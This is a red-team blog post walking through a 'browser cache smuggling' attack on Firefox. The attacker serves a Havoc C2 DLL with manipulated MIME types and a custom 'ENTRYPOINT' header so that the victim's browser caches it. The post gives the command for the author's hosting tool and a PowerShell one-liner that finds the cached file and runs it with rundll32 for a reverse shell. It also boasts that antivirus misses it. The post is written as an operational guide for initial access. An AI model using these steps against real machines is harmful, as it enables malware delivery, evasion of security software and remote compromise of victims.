---
title: Firefox Cache Smuggling Attack
date: 2023-10-25 6:00:00 -500
categories:
  - red teaming
  - initial access
tags:
  - initialaccess
  - redteaming
  - firefox
  - cachesmuggling
  - exploitation
---
# Brower Cache Smuggling Attack

In the red team assessment initial access is always challenging task , as a red teamer we have to find our ways to get our first foothold to the network. Generally we use phishing attacks for that matter , try to trick user implement our social engineering skills and some how we try to make our victim download and run our stage1 payloads. But this are old tradecraft, these days they these technique doesn't work anymore.

Apart From that , these techniques are easily got flagged by AV software or EDR's . they can easily flag the anomaly for these TTPs , where we use certain download cradle to fetch the stage1 of our payload.  so, how to overcome those traditional methods.

in recent time , few CVE comes to highlight that provide good strategy in terms of initial access one of them is WINRAR remote code execution. which is very good. but threat intel for certain company would definatly fix it. (we can give a shot at least)

The new methodology that i would be talking about in this article is Browser cache smuggling attack for initial access to red teamer. This technique can be very powerful  for the initial delivery of our malware.  although it would require social engineering skills in place , but it is more sophisticated then traditional methods.

so, why should we use this technique ? , apart from the less practiced attack vector , this technique provide an excellent way to bypass initial AV detection . so , get ready to dive deeper !! lets start ........

# What is Browser cache 

When we visit any website  , there's lot of content that our browser fetches from the websites , like CSS, HTML , JavaScript , Images , Video , etc. Now our browser actually cache (save's a local copy) of certain data , that wont be change too frequently , example a browser would save a local copy of font file , images or JS . Browser implement this caching system to reduce the latency and increase the loading speed of the website for better user experience. Here is example of some cache files that are stored by Firefox at :

`C:\Users\szero\AppData\Local\Mozilla\Firefox\Profiles\i5se2r5j.default-release\cache2\entries` 

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025165334.png)

These files' names are randomly generate and stored to specific location by default without extension. For example , lets Clear these cache , and visit any website like google :

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025165703.png)

as you can see these are all the files that are cache by google, means these files are automatically save to local file system. 

If we just try to look from malicious perspective , our payload already gets saved locally without any interaction !! 
# How Caching Mechanisms Works Under the Hood

Brower's by default do not cache any file that they fetch , actually browser's main engine look for `content-type` header from the response of the webserver. Example look at this from google.

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025170427.png)

Here we can see its `image/png` , This is called mime type. The webserver uses these own mechanism for defining mime types, means on severing which file what should be it's mime type. generally Linux based server used the file at `/etc/mime.types` to map the content-type with the file type . example , look at these mime type mapping with file type :

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025171156.png)

form above we can see that if our webserver is delivering the file type of com , exe or bat or even Dll . then its content type would be `application/x-msdos-program`  .

Certain different Server use their own way of defining mime types , example nginx would use its own mime type file .

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025171547.png)

Now what if we manipulate the mime-type with wrong file type ?  you guessed it right !! Browser then can cache(save) our hosted data(malicious DLL here) as local copy !!  so we have to manipulate the mime-types for that ,  Once our malicious data gets cached by browser we just have to execute it on victim machine without worrying about the actually delivery of first staged payload !! 

Now again another problem, ok somehow we managed to cache the data !! what about execution ? how we gonna execute it ? 

So, when the browser keep the cache , apart from the original body of the cache data , it also stored HTTP headers along with cache data . so we can actually server our malicious payload with custom http header , that would provide us with ease to find the exact DLL file that we want to run. Example here we severed the data with custom http header `Tag: ENTERYPOINT`  , which will be cached by browser , then we can execute it by filtering on basis of this tag `ENTRYPOINT` . 

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025200839.png)

# How To Perform Browser Cache Smuggling

So, I have created a tool called **[BrowserCacheSmuggling](https://github.com/surya-dev-singh/BrowserCacheSmuggling)**  That will help in setting our Rouge HTTP server that will coerce the Browser to Cache the data , that was not indented to cache. 

**Here are the pre-requisite things that we will need** Before Running the tool :

- nginx installation
- [BrowserCacheSmuggling](https://github.com/surya-dev-singh/BrowserCacheSmuggling)
- Havoc / any other C2
- Linux machine
- victim machine with Firefox installed
### Step 1 : Generate Malicious DLL

First , Generate the malicious DLL , you can use any C2 , i would be following Havoc C2 . 

- For generating our malicious DLL from havoc c2, we first have to configure & start our listner by going to `view -> Listner` .

- Now we have generate our DLL by going to `attack -> Payload`  and configure the setting accordingly 

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025174208.png)

- Once we have our malicious DLL ready  , lets now move on to the step of manipulating the mime type of the server 

### Step 2 : Hosting Malicious Data 

- First clone the [BrowserCacheSmuggling](https://github.com/surya-dev-singh/BrowserCacheSmuggling) tool & Install the dependency `pip3 install -r requirements.txt` 

- Now lets Perform the attack with our malicious DLL like so : `python3 browsercachesmuggling.py --dll /root/smugglers.dll`

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025190619.png)

- It will server our malicious DLL . Now wait for the victim to visit your website . once victim visits your site . the DLL (which is hidden in browser page) will get cached by browser

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025191046.png)

- We will also gets logs when someone visits our Rouge server.

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025192341.png)

- Now since our DLL is cached by browser , we Now just have to run the following command on the victim to filter the specific DLL and execute it with `rundll32` .

```powershell
foreach ($files in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries\")) {Get-ChildItem $files -Recurse | ForEach-Object {if (Select-String -Pattern "ENTRYPOINT" -Path $_.FullName) {$dllPath = $_.FullName + '.'; rundll32.exe $dllPath,MainDll}}}
```

SO , This would Provide us with Reverse Connection !!

![](/assets/img/Cache Smuggling Attack/Pasted image 20231025195326.png)

And as you can see we got reverse connection , also it doesn't flagged by AV engine !! 
# Conclusion


This is one of the most sophisticated attack vector I have seen , it would provide best way to for the initial delivery of the malware or payload .

Thank for reading my article !
